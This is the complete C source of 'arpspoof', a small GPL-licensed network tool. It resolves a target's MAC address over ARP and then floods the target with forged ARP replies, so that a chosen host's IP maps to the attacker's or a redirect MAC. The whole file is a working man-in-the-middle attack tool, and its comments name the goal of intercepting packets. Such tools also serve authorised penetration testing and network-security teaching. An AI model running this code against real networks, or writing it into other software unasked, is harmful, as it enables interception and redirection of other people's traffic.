/**
 * arpspoof.c
 *
 * Copyright (C) 2010 -  Wei-Ning Huang (AZ) <aitjcize@gmail.com>
 * All Rights reserved.
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#include <arpa/inet.h>
#include <getopt.h>
#include <libnet.h>
#include <net/if_arp.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <pcap.h>
#include <signal.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#define IP_ADDR_LEN 4

#define LOG_INFO    0x1
#define LOG_FATAL   0x2
#define LOG_LIBNET  0x4
#define LOG_PCAP    0x8

void usage(void);
void slog(int level, const char *fmt, ...);
void build_packet(int op, u_int8_t* src_ip, u_int8_t* src_mac,
    u_int8_t* dst_ip, u_int8_t* dst_mac);
void start_spoof(int send_interval);
int get_mac_by_ip(in_addr_t ip, struct libnet_ether_addr *mac);
void arp_packet_handler_cb(u_char* imp, const struct pcap_pkthdr* pkinfo,
                                 const u_char* packet);

const char* program_name = "arpspoof";
const char* program_version = "0.1";

static struct option longopts[] = {
  { "interface",  required_argument, NULL, 'i' },
  { "interval" ,  required_argument, NULL, 'n' },
  { "target",     required_argument, NULL, 't' },
  { "redirect",   required_argument, NULL, 'r' },
  { "help",       no_argument,       NULL, 'h' },
  { "version",    no_argument,       NULL, 'v' }
};

libnet_t* lnc = 0;
pcap_t* pcc = 0;
in_addr_t tgt_ip = 0, red_ip = 0, spf_ip = 0;
struct libnet_ether_addr tgt_mac, red_mac;
char* intf = NULL;                     /* interface */

typedef struct _ip_mac_pair {
  int complete;                  /* whether ip and mac are both specified */
  in_addr_t* ip;
  struct libnet_ether_addr* mac;
} ip_mac_pair;

int main(int argc, char *argv[])
{
  char err_buf[LIBNET_ERRBUF_SIZE > PCAP_ERRBUF_SIZE?
               LIBNET_ERRBUF_SIZE: PCAP_ERRBUF_SIZE];
  struct bpf_program bp;
  int opt = 0;
  int send_interval = 1000000;           /* send interval in usecond */
  char* target_ip_str = NULL;            /* IP which packets is send to */
  char* spoof_ip_str = NULL;             /* IP we want to intercept packets */
  char* redirect_ip_str  = NULL;         /* IP of MAC we want to redirect 
                                            packets to, if not specified,
                                            attacker's MAC is used */

  while ((opt = getopt_long(argc, argv, "i:n:t:r:hv", longopts, NULL)) != -1) {
    switch(opt) {
      case 'i':
        intf = optarg;
        break;
      case 'n':
        send_interval = atoi(optarg);
        break;
      case 't':
        target_ip_str = optarg;
        break;
      case 'r':
        redirect_ip_str = optarg;
        break;
      case 'h':
        usage();
        exit(0);
      case 'v':
        printf("Version: %s\n", program_version);
        exit(0);
    }
  }

  /* check if use is root */
  if (getuid() && geteuid()) {
    fprintf(stderr, "%s: must run as root\n", program_name);
    exit(1);
  }

  if (!intf) {
    fprintf(stderr, "%s: must specify interface\n", program_name);
    exit(1);
  }

  /* libnet init */
  lnc = libnet_init(LIBNET_LINK_ADV, intf, err_buf);

  /* pcap init */
  if (!(pcc = pcap_open_live(intf, 100, 0, 10, err_buf)))
    slog(LOG_PCAP, "pcap_init_live() error\n");

  /* set capture filter */
  if (-1 == pcap_compile(pcc, &bp, "arp", 0, -1))
    slog(LOG_PCAP, "pcap_compile(): error\n");

  if (-1 == pcap_setfilter(pcc, &bp))
    slog(LOG_PCAP, "pcap_setfilter(): error\n");

  /* If target not specified, set to broadcast */
  if (target_ip_str) {
    if (-1 == (tgt_ip = libnet_name2addr4(lnc, target_ip_str, LIBNET_RESOLVE)))
      slog(LOG_LIBNET, "invalid target IP address\n");
    if (!get_mac_by_ip(tgt_ip, &tgt_mac))
      slog(LOG_LIBNET, "can't resolve MAC address for %s\n", target_ip_str);
  } else
    memcpy(tgt_mac.ether_addr_octet,"\xff\xff\xff\xff\xff\xff",ETHER_ADDR_LEN);

  /* If redirect IP not specified, packets are redirect to the attacker */
  if (redirect_ip_str) {
    if (-1 == (red_ip = libnet_name2addr4(lnc,redirect_ip_str,LIBNET_RESOLVE)))
      slog(LOG_LIBNET, "invalid redirect IP address\n");
    if (!get_mac_by_ip(red_ip, &red_mac))
      slog(LOG_FATAL, "can't resolve MAC address for %s\n",redirect_ip_str);
  } else {
    struct libnet_ether_addr* ptmp = libnet_get_hwaddr(lnc);
    if (ptmp == NULL)
      slog(LOG_LIBNET, "can't resolve MAC address for localhost\n");
    memcpy(red_mac.ether_addr_octet, ptmp->ether_addr_octet, ETHER_ADDR_LEN);
  }

  if (optind == argc)
    slog(LOG_FATAL, "must specified host IP address\n");
  spoof_ip_str = argv[optind];
  spf_ip = libnet_name2addr4(lnc, spoof_ip_str, LIBNET_RESOLVE);

  build_packet(ARPOP_REPLY, (u_int8_t*)&spf_ip, (u_int8_t*)&red_mac,
               (u_int8_t*)&tgt_ip, (u_int8_t*)&tgt_mac);

  start_spoof(send_interval);

  libnet_destroy(lnc);

  return 0;
}

void build_packet(int op, u_int8_t* src_ip, u_int8_t* src_mac,
    u_int8_t* dst_ip, u_int8_t* dst_mac) {

  libnet_ptag_t p_tag;

  p_tag = libnet_build_arp(      /* construct arp packet */
      ARPHRD_ETHER,              /* hardware type ethernet */
      ETHERTYPE_IP,              /* protocol type */
      ETHER_ADDR_LEN,            /* mac length */
      IP_ADDR_LEN,               /* protocol length */
      op,                        /* op type */
      src_mac,                   /* source mac addr */
      src_ip,                    /* source ip addr */
      dst_mac,                   /* dest mac addr */
      dst_ip,                    /* dest ip addr */
      NULL,                      /* payload */
      0,                         /* payload length */
      lnc,                       /* libnet context */
      0                          /* 0 stands to build a new one */
  );

  if (-1 == p_tag)
    slog(LOG_LIBNET, "can't build arp header\n");

  if (op == ARPOP_REQUEST)
    dst_mac = (u_int8_t*)"\xff\xff\xff\xff\xff\xff";

  p_tag = libnet_build_ethernet( /* create ethernet header */
      dst_mac,                   /* dest mac addr */
      src_mac,                   /* source mac addr */
      ETHERTYPE_ARP,             /* protocol type */
      NULL,                      /* payload */
      0,                         /* payload length */
      lnc,                       /* libnet context */
      0                          /* 0 to build a new one */
  );

  if (-1 == p_tag)
    slog(LOG_LIBNET, "can't build ethernet header\n");
}

void start_spoof(int send_interval) {
  int c = 0;
  while (1) {
    if (-1 == libnet_write(lnc)) {
      slog(LOG_LIBNET, "can't send packet\n");
    }
    if (tgt_ip != 0) {
      printf("%s: 42 bytes, target: %s: %s is at ", intf,
        libnet_addr2name4(tgt_ip, LIBNET_DONT_RESOLVE),
        libnet_addr2name4(spf_ip, LIBNET_DONT_RESOLVE));
      for (c = 0; c < 6; c++)
        printf("%.2x%c", ((u_char*)&red_mac)[c], (c < 5)? ':': '\n');
    } else {
      printf("%s: 42 bytes, target: broadcasting: %s is at ", intf,
        libnet_addr2name4(spf_ip, LIBNET_DONT_RESOLVE));
      for (c = 0; c < 6; c++)
        printf("%.2x%c", ((u_char*)&red_mac)[c], (c < 5)? ':': '\n');
    }
    usleep(send_interval);
  }
}

int get_mac_by_ip(in_addr_t ip, struct libnet_ether_addr *mac) {
  int i = 0;
  ip_mac_pair imp = {0, &ip, mac};

  in_addr_t local_ip = libnet_get_ipaddr4(lnc);
  struct libnet_ether_addr* local_mac = libnet_get_hwaddr(lnc);

  if (local_mac == NULL)
    slog(LOG_LIBNET, "can't resolve MAC address for localhost\n");
  build_packet(ARPOP_REQUEST, (u_int8_t*)&local_ip, (u_int8_t*)local_mac,
               (u_int8_t*)&ip, (u_int8_t*)"\x00\x00\x00\x00\x00\x00");

    printf("%s: 42 bytes, broadcasting: Who has %s? Tell %s\n", intf,
        libnet_addr2name4(ip, LIBNET_DONT_RESOLVE),
        libnet_addr2name4(local_ip, LIBNET_DONT_RESOLVE));
  do {
    /* send arp request */
    if (-1 == libnet_write(lnc))
      slog(LOG_LIBNET, "can't send packet\n");

    /* capture arp reply */
    *mac->ether_addr_octet = 0;
    pcap_dispatch(pcc, 1, arp_packet_handler_cb, (u_char*) &imp);
    if (imp.complete) {
      int c = 0;
      printf("%s: 42 bytes, received: %s is at ", intf,
          libnet_addr2name4(ip, LIBNET_DONT_RESOLVE));
      for (c = 0; c < 6; c++)
        printf("%.2x%c", ((u_char*)(imp.mac))[c], (c < 5)? ':': '\n');
      return 1;
    }
    usleep(100000);
  }
  while (++i < 30); /* try for 3 seconds */
  return 0;
}

void arp_packet_handler_cb(u_char* imp, const struct pcap_pkthdr* pkinfo,
                                 const u_char* packet) {
  struct libnet_802_3_hdr *h_eth;
  struct libnet_arp_hdr *h_arp;

  h_eth = (void*)packet;
  h_arp = (void*)((char*)h_eth + LIBNET_ETH_H);

  if ((htons(h_arp->ar_op) == ARPOP_REPLY)
      && (htons(h_arp->ar_pro) == ETHERTYPE_IP)
      && (htons(h_arp->ar_hrd) == ARPHRD_ETHER)) {
    in_addr_t ip;
    memcpy(&ip, (char*)h_arp + LIBNET_ARP_H + h_arp->ar_hln, 4);
    if (memcmp(&ip, ((ip_mac_pair*)imp)->ip, IP_ADDR_LEN) == 0) {
      memcpy(((ip_mac_pair*)imp)->mac, h_eth->_802_3_shost, ETHER_ADDR_LEN);
      ((ip_mac_pair*)imp)->complete = 1;
      return;
    }
  }
}

void slog(int level, const char *fmt, ...) {
  va_list vap;

  if ((level & LOG_LIBNET) == LOG_LIBNET) {
    char* tmp = libnet_geterror(lnc);
    if (tmp && strlen(tmp) != 0)
      fprintf(stderr, "%s: %s\n", program_name, tmp);
  }

  if ((level & LOG_PCAP) == LOG_PCAP) {
    char* tmp = pcap_geterr(pcc);
    if (tmp && strlen(tmp) != 0)
      fprintf(stderr, "%s: %s\n", program_name, tmp);
  }

  fprintf(stderr, "%s: ", program_name);
  va_start(vap, fmt);
  vfprintf(stderr, fmt, vap);
  va_end(vap);

  if ((level & LOG_INFO) != LOG_INFO)
    exit(1);
}

void usage(void) {
  fprintf(stderr, "Usage: %s [-i interface] [-t target IP] [-r redirect IP]"
                  " host\n", program_name);
}
